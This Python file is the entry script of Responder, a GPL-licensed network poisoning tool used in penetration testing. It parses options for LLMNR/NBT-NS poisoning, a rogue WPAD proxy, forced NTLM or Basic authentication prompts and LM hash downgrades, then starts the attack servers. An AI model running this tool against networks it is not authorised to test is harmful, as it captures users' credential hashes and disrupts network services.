#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import optparse
from utils import *
from servers.ServersPool import ServersPool

banner()

parser = optparse.OptionParser(usage='python %prog -I eth0 -w -r -f\nor:\npython %prog -I eth0 -wrf', version=settings.__version__, prog=sys.argv[0])
parser.add_option('-A','--analyze',        action="store_true", help="Analyze mode. This option allows you to see NBT-NS, BROWSER, LLMNR requests without responding.", dest="Analyze", default=False)
parser.add_option('-I','--interface',      action="store",      help="Network interface to use, you can use 'ALL' as a wildcard for all interfaces", dest="Interface", metavar="eth0", default=None)
parser.add_option('-i','--ip',             action="store",      help="Local IP to use \033[1m\033[31m(only for OSX)\033[0m", dest="OURIP", metavar="10.0.0.21", default=None)

parser.add_option('-e', "--externalip",    action="store",      help="Poison all requests with another IP address than Responder's one.", dest="ExternalIP",  metavar="10.0.0.22", default=None)

parser.add_option('-b', '--basic',         action="store_true", help="Return a Basic HTTP authentication. Default: NTLM", dest="Basic", default=False)
parser.add_option('-r', '--wredir',        action="store_true", help="Enable answers for netbios wredir suffix queries. Answering to wredir will likely break stuff on the network. Default: False", dest="Wredirect", default=False)
parser.add_option('-d', '--NBTNSdomain',   action="store_true", help="Enable answers for netbios domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False", dest="NBTNSDomain", default=False)
parser.add_option('-f','--fingerprint',    action="store_true", help="This option allows you to fingerprint a host that issued an NBT-NS or LLMNR query.", dest="Finger", default=False)
parser.add_option('-w','--wpad',           action="store_true", help="Start the WPAD rogue proxy server. Default value is False", dest="WPAD_On_Off", default=False)
parser.add_option('-u','--upstream-proxy', action="store",      help="Upstream HTTP proxy used by the rogue WPAD Proxy for outgoing requests (format: host:port)", dest="Upstream_Proxy", default=None)
parser.add_option('-F','--ForceWpadAuth',  action="store_true", help="Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt. Default: False", dest="Force_WPAD_Auth", default=False)

parser.add_option('-P','--ProxyAuth',       action="store_true", help="Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective when combined with -r. Default: False", dest="ProxyAuth_On_Off", default=False)

parser.add_option('--lm',                  action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier. Default: False", dest="LM_On_Off", default=False)
parser.add_option('-v','--verbose',        action="store_true", help="Increase verbosity.", dest="Verbose")
options, args = parser.parse_args()

if not os.geteuid() == 0:
    print color("[!] Responder must be run as root.")
    sys.exit(-1)
elif options.OURIP is None and IsOsX() is True:
    print "\n\033[1m\033[31mOSX detected, -i mandatory option is missing\033[0m\n"
    parser.print_help()
    exit(-1)

settings.init()
settings.Config.populate(options)

StartupMessage()

settings.Config.ExpandIPRanges()

if settings.Config.AnalyzeMode:
    print color('[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.', 3, 1)

def main():
    try:
        serversPool = ServersPool(options)
        print color('[+]', 2, 1) + " Listening for events..."
        serversPool.start()
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        sys.exit("\r%s Exiting..." % color('[+]', 2, 1))

if __name__ == '__main__':
	main()
